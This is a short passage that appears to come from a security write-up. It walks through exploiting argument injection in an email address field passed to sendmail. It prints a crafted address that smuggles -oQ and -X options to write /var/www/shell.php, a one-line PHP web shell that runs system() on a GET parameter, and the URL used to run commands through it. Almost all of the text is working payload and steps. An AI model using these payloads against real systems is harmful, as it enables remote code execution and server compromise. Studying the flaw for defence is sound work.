The exploitation of this issue is done in two steps:

    Create a file with a PHP extension in the web root of the server.
    Access the newly created file.

To create the file, you can inject some extra-arguments to the command as part of the email address:

"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1

This will allow us to create the file /var/www/shell.php. To get code execution, we also need to inject a web shell in the email's body:

<?php system($_GET['c']);?>

Finally, you need to access your web shell to execute commands using the 'c' parameter.

http://someURL.com/shell.php?c=/
